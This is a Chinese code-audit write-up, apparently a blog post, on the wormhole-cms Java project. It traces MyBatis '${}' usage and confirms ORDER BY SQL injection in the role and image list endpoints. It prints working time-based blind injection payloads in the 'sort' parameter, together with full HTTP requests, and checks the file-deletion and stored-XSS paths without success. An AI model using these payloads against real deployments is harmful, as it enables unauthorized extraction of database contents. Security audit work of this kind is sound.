---
title: wormhole-cms
description: GitHub地址-https://github.com/wormhole/cms
date: 2024-12-16
image: cover.png
categories:
    - cate2
tags:
    - Code Audit
---

## 项目结构

```$xslt
├─java
│  └─net
│      └─stackoverflow
│          └─cms
│              ├─common             (公共代码)
│              ├─config             (配置)
│              ├─constant           (常量类)
│              ├─dao                (数据库访问层)
│              ├─exception          (自定义异常类)
│              ├─model              
│              │  ├─entity          (实体类)
│              │  └─vo              (View Object)
│              ├─security           (Spring Security相关代码)
│              ├─service            (服务层代码）
│              ├─util               (工具类)
│              └─web                
│                  ├─controller     (业务层代码)
│                  │  ├─auth        (认证授权模块)
│                  │  ├─config      (系统设置模块)
│                  │  ├─dashboard   (仪表盘页面)
│                  │  └─personal    (个人详情页面)
│                  ├─filter         (过滤器)
│                  ├─interceptor    (拦截器)
│                  └─listener       (监听器)
└─resources                         
    ├─keystore                      (https key)
    ├─lib                           (sigar动态库)
    ├─mapper                        (Mybatis mapper文件)
    ├─sql                           (建库脚本)
    ├─static                        (静态文件,前端打包后放这)
    ├─templates                     (模板文件)
    ├─application.properties        (配置文件)
    └─logback.xml                   (logback日志配置)
```

## 项目依赖审计

​	经过对项目依赖的审计发现，该项目引入依赖较少，且没有已披露的漏洞。

## 单点漏洞审计

### SQL

​	因为该项目使用了mybatis，所以我们可以直接来到resource下的mapper目录审计里面的xml文件。

#### src/main/resources/mapper/MenuMapper.xml

​	该文件中有两处使用了$，分别是：

第13行：

```xml
    <sql id="where">
        <where>
            <if test="eqWrapper != null">
                <foreach collection="eqWrapper.entrySet()" index="column" item="value">
                    <if test="column != null and value != null">
                        and `${column}` = #{value}
                    </if>
                </foreach>
            </if>
            <if test="neqWrapper != null">
                <foreach collection="neqWrapper.entrySet()" index="column" item="value">
                    <if test="column != null and value != null">
                        and `${column}` != #{value}
                    </if>
                </foreach>
            </if>
            <if test="inWrapper != null">
                <foreach collection="inWrapper.entrySet()" index="column" item="values">
                    <if test="values != null and values.size() > 0">
                        and `${column}` in
                        <foreach collection="values" item="value" open="(" separator="," close=")">
                            #{value}
                        </foreach>
                    </if>
                </foreach>
            </if>
            <if test="ninWrapper != null">
                <foreach collection="ninWrapper.entrySet()" index="column" item="values">
                    <if test="values != null and values.size() > 0">
                        and `${column}` not in
                        <foreach collection="values" item="value" open="(" separator="," close=")">
                            #{value}
                        </foreach>
                    </if>
                </foreach>
            </if>
            <if test="keyWrapper != null and keyWrapper.size() > 0">
                <foreach collection="keyWrapper.entrySet()" index="key" item="columns">
                    <if test="columns != null and columns.size() > 0">
                        and
                        <foreach collection="columns" item="column" open="(" separator=" or " close=")">
                            `${column}` like CONCAT('%',#{key},'%')
                        </foreach>
                    </if>
                </foreach>
            </if>
        </where>
    </sql>
```

第75行：

```xml
    <select id="selectWithQuery" resultMap="baseMap">
            select * from `menu`
            <include refid="where"/>
            <if test="sortWrapper != null and sortWrapper.size() > 0">
                order by
                <foreach collection="sortWrapper.entrySet()" index="s" item="o" separator=",">
                    `${s}` ${o}
                </foreach>
            </if>
            <if test="offset != null and limit != null">
                limit #{offset}, #{limit}
            </if>
    </select>
```

​	可以看到这里第13行的查询语句中的column参数使用了$，而第75行则是s和o使用了$。所以这里公共有三个可以注入点，我们一个个测试。

##### column（失败）

​	我们在这个xml文件中搜索where，发现有这几个地方调用了这个where语句，分别是：

62行：

```xml
    <select id="countWithQuery" resultType="int">
        select COUNT(*) from `menu`
        <include refid="where"/>
    </select>
```

75行：

```xml
    <select id="selectWithQuery" resultMap="baseMap">
        select * from `menu`
        <include refid="where"/>
        <if test="sortWrapper != null and sortWrapper.size() > 0">
            order by
            <foreach collection="sortWrapper.entrySet()" index="s" item="o" separator=",">
                `${s}` ${o}
            </foreach>
        </if>
        <if test="offset != null and limit != null">
            limit #{offset}, #{limit}
        </if>
    </select>
```

116行：

```xml
    <delete id="deleteWithQuery">
        delete from `menu`
        <include refid="where"/>
    </delete>
```

161行：

```xml
    <update id="updateWithQuery">
        update `menu`
        <set>
            <if test="setWrapper != null">
                <if test="setWrapper.id != null">
                    `id` = #{setWrapper.id},
                </if>
                <if test="setWrapper.title != null">
                    `title` = #{setWrapper.title},
                </if>
                <if test="setWrapper.key != null">
                    `key` = #{setWrapper.key},
                </if>
                <if test="setWrapper.parent != null">
                    `parent` = #{setWrapper.parent},
                </if>
                <if test="setWrapper.ts != null">
                    `ts` = #{setWrapper.ts},
                </if>
            </if>
        </set>
        <include refid="where"/>
    </update>
```

​	一共有2个select，一个delete以及一个update调用了这个where语句，因为他们产生SQL注入的原因是相同的，所以我们只需要证明其中一个存在SQL注入即可，我们从第一个select开始追溯，也就是第62行的select语句。

​	向上追溯：

```java
    @GetMapping("/count")
    public ResponseEntity<Result<CountDTO>> count() {
        CountDTO dto = dashboardService.count();
        return ResponseEntity.status(HttpStatus.OK).body(Result.success(dto));
    }
```

​	确认被count路由调用，不过这里并没有接受传参，也就是说没有可操控的参数，所以这里是不存在SQL注入的。那么我们转移到第二个select语句中。

​	经过审计发现，该select语句中的where有两个方法调用了它，但是这两个方法中的参数仅有value可控而column是不可控的，所以这里是不存在SQL注入的。

```java
    public List<String> findIdsByKeys(List<String> keys) {
        List<String> ids = new ArrayList<>();
        if (!CollectionUtils.isEmpty(keys)) {
            List<Menu> menus = menuDAO.selectWithQuery(QueryWrapper.newBuilder().in("key", keys).build());
            menus.forEach(menu -> ids.add(menu.getId()));
        }
        return ids;
    }
```

```java
    @Override
    @Transactional(rollbackFor = Exception.class)
    public List<String> findKeysByRoleId(String id) {
        List<String> keys = new ArrayList<>();
        List<RoleMenuRef> refs = roleMenuRefService.findByRoleId(id);
        if (!CollectionUtils.isEmpty(refs)) {
            List<String> ids = new ArrayList<>();
            refs.forEach(ref -> ids.add(ref.getMenuId()));
            List<Menu> menus = menuDAO.selectWithQuery(QueryWrapper.newBuilder().in("id", ids).build());
            menus.forEach(menu -> keys.add(menu.getKey()));
        }
        return keys;
    }
```

​	那么我们转到delete，但是delete则是未被调用，所以我们再转到update发现这个也未被调用，所以这个where语句是不存在SQL注入的。

##### 	s、o（失败）

​	我们向上追溯，找到了该参数仅有的控制器。

```java
    @GetMapping("/menu_tree")
    public ResponseEntity<Result<List<MenuDTO>>> queryMenuTree() {
        List<MenuDTO> dtos = menuService.findTree();
        return ResponseEntity.status(HttpStatus.OK).body(Result.success(dtos));
    }
```

​	经过审计发现，这里的两个参数均无法操控，所以这里仍旧不存在SQL注入。

#### src/main/resources/mapper/RoleMapper.xml（成功）

​	这个xml文件和前一个是相同的，所以这里就不贴出并作分析了，仅贴出存在SQL注入的代码片段。

```xml
    <select id="selectWithQuery" resultMap="baseMap">
        select * from `role`
        <include refid="where"/>
        <if test="sortWrapper != null and sortWrapper.size() > 0">
            order by
            <foreach collection="sortWrapper.entrySet()" index="s" item="o" separator=",">
                `${s}` ${o}
            </foreach>
        </if>
        <if test="offset != null and limit != null">
            limit #{offset}, #{limit}
        </if>
    </select>
```

​	这里审计我们可知s和o都是可疑注入点，我们向上追溯发现有多处调用了这个select语句。经过审计之后确定如下方法中存在调用，并且参数s和o均可控，除此之外的其他方法并没有使用到order by语句的定义，虽使用了where，但是column参数不可控，所以不存在SQL注入。

```java
    @Override
    @Transactional(rollbackFor = Exception.class)
    public PageResponse<RoleDTO> findByPage(Integer page, Integer limit, String sort, String order, String key) {
        Set<String> roleIds = new HashSet<>();
        QueryWrapperBuilder builder = new QueryWrapperBuilder();
        builder.sort("builtin", "desc");
        if (StringUtils.isEmpty(sort) || StringUtils.isEmpty(order)) {
            builder.sort("name", "asc");
        } else {
            builder.sort(sort, order);
        }
 /*此处代码省略*/
        QueryWrapper wrapper = builder.build();

        List<Role> roles = roleDAO.selectWithQuery(wrapper);
 /*此处代码省略*/
    }
```

​	经过审计我们发现这个方法中在

```java
if (StringUtils.isEmpty(sort) || StringUtils.isEmpty(order)) {
    builder.sort("name", "asc");
} else {
    builder.sort(sort, order);
}
```

​	这个代码块中将sort和order参数放入了builder对象中，而在此之前并没有进行防止SQL注入的处理，而这两个参数就是在xml文档中的o和s所以这里是存在一个SQL注入的。

​	而这个方法则被下面这个控制器所调用：

```java
    @GetMapping(value = "/list")
    public ResponseEntity<Result<PageResponse<RoleDTO>>> queryPage(
            @RequestParam(value = "page") @Min(value = 1, message = "page不能小于1") Integer page,
            @RequestParam(value = "limit") @Min(value = 1, message = "limit不能小于1") Integer limit,
            @RequestParam(value = "sort", required = false) String sort,
            @RequestParam(value = "order", required = false) String order,
            @RequestParam(value = "key", required = false) String key) {
        PageResponse<RoleDTO> response = roleService.findByPage(page, limit, sort, order, key);
        return ResponseEntity.status(HttpStatus.OK).body(Result.success(response));
    }
```

​	可见这里也没有进行处理，直接就将参数传入到findByPage方法中。那么我们定位到前端的角色管理模块，访问后抓包，抓得如下数据包。

```http
GET /auth/role/list?page=1&limit=10 HTTP/1.1
Host: 172.23.192.1
Cookie: JSESSIONID=FDA8E97A658F3DE8725A3002F1A847E6
Sec-Ch-Ua-Platform: "Windows"
Authorization: Bearer eyJ1aWQiOiIzYTEzOGJhYS0yYWZhLTQwZWMtOGVlMy03NjEyNTg2Y2UzZmIiLCJ0cyI6IjE3MzQzMTM2MDYyNjcifQ==.MGE2M2JlZTE2MmViNDVjYjY4ZTc1NDk2ZjQzOWVlZmI=
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0
Accept: application/json, text/plain, */*
Sec-Ch-Ua: "Microsoft Edge";v="131", "Chromium";v="131", "Not_A Brand";v="24"
Sec-Ch-Ua-Mobile: ?0
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://172.23.192.1/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
Priority: u=1, i
Connection: close
```

​	构造参数sort和order

```http
GET /auth/role/list?page=1&limit=10&sort=builtin&order=desc HTTP/1.1
Host: 172.23.192.1
Cookie: JSESSIONID=FDA8E97A658F3DE8725A3002F1A847E6
Sec-Ch-Ua-Platform: "Windows"
Authorization: Bearer eyJ1aWQiOiIzYTEzOGJhYS0yYWZhLTQwZWMtOGVlMy03NjEyNTg2Y2UzZmIiLCJ0cyI6IjE3MzQzMTM2MDYyNjcifQ==.MGE2M2JlZTE2MmViNDVjYjY4ZTc1NDk2ZjQzOWVlZmI=
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0
Accept: application/json, text/plain, */*
Sec-Ch-Ua: "Microsoft Edge";v="131", "Chromium";v="131", "Not_A Brand";v="24"
Sec-Ch-Ua-Mobile: ?0
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://172.23.192.1/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
Priority: u=1, i
Connection: close
```

​	根据xml文档中的定义我们构造如下payload：

sort:

```sql
builtin%60,if(length((select%20database()))=1,sleep(0.5),1),%60builtin
```

order:

```sql
desc
```

​	使用BP爆破模块爆破得到如下数据：

![image-20241216113807251](/image-20241216113807251.png)

​	处理后得到库名：

![image-20241216113932096](/image-20241216113932096.png)

#### src/main/resources/mapper/UploadMapper.xml（成功）

```xml
    <select id="selectWithQuery" resultMap="baseMap">
        select * from `upload`
        <include refid="where"/>
        <if test="sortWrapper != null and sortWrapper.size() > 0">
            order by
            <foreach collection="sortWrapper.entrySet()" index="s" item="o" separator=",">
                `${s}` ${o}
            </foreach>
        </if>
        <if test="offset != null and limit != null">
            limit #{offset}, #{limit}
        </if>
    </select>
```

​	我们向上追溯：

```java
    @Override
    @Transactional(rollbackFor = Exception.class)
    public PageResponse<UploadDTO> findImageByPage(Integer page, Integer limit, String sort, String order, String key, String userId) {
        QueryWrapperBuilder builder = new QueryWrapperBuilder();
        if (StringUtils.isEmpty(sort) || StringUtils.isEmpty(order)) {
            builder.sort("ts", "desc");
        } else {
            builder.sort(sort, order);
        }
/*此处代码省略*/
        QueryWrapper wrapper = builder.build();

        List<Upload> uploads = uploadDAO.selectWithQuery(wrapper);
        Integer total = uploadDAO.countWithQuery(wrapper);
/*此处代码省略*/
    }
```

​	可见该注入点的SQL注入与上一个SQL的漏洞是相同的。

```java 
    @GetMapping(value = "/list")
    public ResponseEntity<Result<PageResponse<UploadDTO>>> queryPage(
            @RequestParam(value = "page") @Min(value = 1, message = "page不能小于1") Integer page,
            @RequestParam(value = "limit") @Min(value = 1, message = "limit不能小于1") Integer limit,
            @RequestParam(value = "sort", required = false) String sort,
            @RequestParam(value = "order", required = false) String order,
            @RequestParam(value = "key", required = false) String key) {

        PageResponse<UploadDTO> response = uploadService.findImageByPage(page, limit, sort, order, key, super.getUserId());
        return ResponseEntity.status(HttpStatus.OK).body(Result.success(response));
    }
```

​	不过在前端测试之前，由于作者似乎尚未实现上传图片的方法，因此我们需要先在数据库中插入一条数据，保证order by会被执行，而不是由于没有数据而发生短路：

![image-20241216115905793](/image-20241216115905793.png)

​	那么我们接下来只需要构造如下数据包：

```http
GET /manage/image/list?page=1&limit=10&sort=id&order=desc HTTP/1.1
Host: 172.23.192.1
Cookie: JSESSIONID=FDA8E97A658F3DE8725A3002F1A847E6
Sec-Ch-Ua-Platform: "Windows"
Authorization: Bearer eyJ1aWQiOiIzYTEzOGJhYS0yYWZhLTQwZWMtOGVlMy03NjEyNTg2Y2UzZmIiLCJ0cyI6IjE3MzQzMTM2MDYyNjcifQ==.MGE2M2JlZTE2MmViNDVjYjY4ZTc1NDk2ZjQzOWVlZmI=
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0
Accept: application/json, text/plain, */*
Sec-Ch-Ua: "Microsoft Edge";v="131", "Chromium";v="131", "Not_A Brand";v="24"
Sec-Ch-Ua-Mobile: ?0
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://172.23.192.1/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
Priority: u=1, i
Connection: close


```

​	再构造payload：

sort:

```sql
id%60,if(length((select%20database()))%5e1,sleep(0.5),1),%60id
```

order:

```sql
desc
```

​	使用BP爆破模块爆破：

![image-20241216115635882](/image-20241216115635882.png)

​	处理数据后得到库名：

![image-20241216115701645](/image-20241216115701645.png)

​	除此之外，在src/main/resources/mapper/UserMapper.xml中也存在同样的SQL注入漏洞，这里由于篇幅限制，就不写出了，有兴趣的师傅可以自行尝试。

### 任意文件操控

​	我们来到文件的控制器发现他，他仅有两个方法，确实没有图片上传的实现，而另一个查询则是从数据库中查询信息，没有可操控的参数，也就不存在任意文件查看了，那么我们关注唯一一个删除的方法。

```java
    @DeleteMapping
    public ResponseEntity<Result<Object>> deleteByIds(@RequestBody @Validated IdsDTO dto) {
        uploadService.deleteByIds(dto.getIds());
        return ResponseEntity.status(HttpStatus.OK).body(Result.success());
    }
```

```java	
    @Override
    @Transactional(rollbackFor = Exception.class)
    public void deleteByIds(List<String> ids) {
        if (!CollectionUtils.isEmpty(ids)) {
            QueryWrapperBuilder builder = new QueryWrapperBuilder();
            builder.in("id", ids);
            List<Upload> uploads = uploadDAO.selectWithQuery(builder.build());
            for (Upload upload : uploads) {
                String path = SysUtils.pwd() + upload.getPath();
                File file = new File(path);
                if (file.exists()) {
                    file.delete();
                }
            }
            uploadDAO.batchDelete(ids);
        }
    }
```

​	该方法是通过用户传入的文件ID从数据库中获取文件的信息，然后通过数据库中的信息去删除文件，所以这里文件的信息是无法操控的，因此也就不存在任意文件操控。

### XSS

```java
    @GetMapping(value = "/list")
    public ResponseEntity<Result<PageResponse<UserDTO>>> queryPage(
            @RequestParam(value = "page") @Min(value = 1, message = "page不能小于1") Integer page,
            @RequestParam(value = "limit") @Min(value = 1, message = "limit不能小于1") Integer limit,
            @RequestParam(value = "sort", required = false) String sort,
            @RequestParam(value = "order", required = false) String order,
            @RequestParam(value = "roleIds[]", required = false) List<String> roleIds,
            @RequestParam(value = "key", required = false) String key) {
        PageResponse<UserDTO> response = userService.findByPage(page, limit, sort, order, key, roleIds);
        return ResponseEntity.status(HttpStatus.OK).body(Result.success(response));
    }
```

​	对于这个用户管理模块的控制器，可见，他在返回前没有对查询返回的结果和传入参数进行防止XSS注入的处理。

```java
    @Override
    @Transactional(rollbackFor = Exception.class)
    public PageResponse<UserDTO> findByPage(Integer page, Integer limit, String sort, String order, String key, List<String> roleIds) {
        Set<String> userIds = new HashSet<>();
        if (!CollectionUtils.isEmpty(roleIds)) {
            List<UserRoleRef> userRoleRefs = userRoleRefService.findByRoleIds(roleIds);
            if (!CollectionUtils.isEmpty(userRoleRefs)) {
                userRoleRefs.forEach(userRoleRef -> userIds.add(userRoleRef.getUserId()));
            } else {
                return new PageResponse<>(0, new ArrayList<>());
            }
        }

        QueryWrapperBuilder builder = new QueryWrapperBuilder();
        builder.sort("builtin", "desc");
        if (StringUtils.isEmpty(sort) || StringUtils.isEmpty(order)) {
            builder.sort("username", "asc");
        } else {
            builder.sort(sort, order);
        }
        builder.like(!StringUtils.isEmpty(key), key, Arrays.asList("username", "telephone", "email"));
        builder.page((page - 1) * limit, limit);
        builder.in("id", new ArrayList<>(userIds));
        QueryWrapper wrapper = builder.build();

        List<User> users = userDAO.selectWithQuery(wrapper);
        Integer total = userDAO.countWithQuery(wrapper);

        List<UserDTO> dtos = new ArrayList<>();
        for (User user : users) {
            UserDTO userDTO = new UserDTO();
            BeanUtils.copyProperties(user, userDTO);
            userDTO.setPassword(null);
            List<RoleDTO> roles = roleService.findByUserId(user.getId());
            userDTO.setRoles(roles);
            dtos.add(userDTO);
        }
        return new PageResponse<>(total, dtos);
    }
```

​	这里也是同样的，对于查询出的结果以及传入的参数没有进行防止XSS的处理，但是这里并没有将传入的参数key嵌入前端页面，所以这里是不存在反射型XSS的，但是查询结果是嵌入了的，所以存储型XSS仍旧值得一试。

```java
    @PostMapping
    public ResponseEntity<Result<Object>> save(@RequestBody @Validated(UserDTO.Insert.class) UserDTO dto) {
        userService.save(dto);
        return ResponseEntity.status(HttpStatus.OK).body(Result.success());
    }
```

​	这里是用户管理模块中的新建用户的保存控制器，我们可以看到没有进行防XSS的处理，那么我们追溯save方法。

```java
    @Override
    @Transactional(rollbackFor = Exception.class)
    public void save(UserDTO dto) {
        //校验数据
        User u = findByUsername(dto.getUsername());
        if (u != null) {
            throw new BusinessException("用户名重复");
        }

        User user = new User();
        BeanUtils.copyProperties(dto, user);
        user.setId(UUID.randomUUID().toString());
        user.setBuiltin(0);
        user.setEnable(1);
        user.setTs(new Date());
        user.setPassword(new BCryptPasswordEncoder().encode(user.getPassword()));
        userDAO.insert(user);

        String roleId = roleService.findIdByName("guest");
        if (roleId != null) {
            userRoleRefService.save(new UserRoleRef(UUID.randomUUID().toString(), user.getId(), roleId, new Date()));
        }
    }
```

​	审计我们可知，检查了用户名是否重复，设置了用户的个人信息，可见依旧没有对XSS进行防御，所以这里在新建用户时是存在一个存储型XSS的。

​	我们尝试存储型XSS：

![image-20241216133642497](/image-20241216133642497.png)

​	可见这里的<被转义了，回顾项目结构我们知道这个项目是存在过滤器的，但是我并没有找到过滤器的文件，而这里的特殊字符也确实被转义了，也就是不存在XSS。
   至此此项目审计完毕。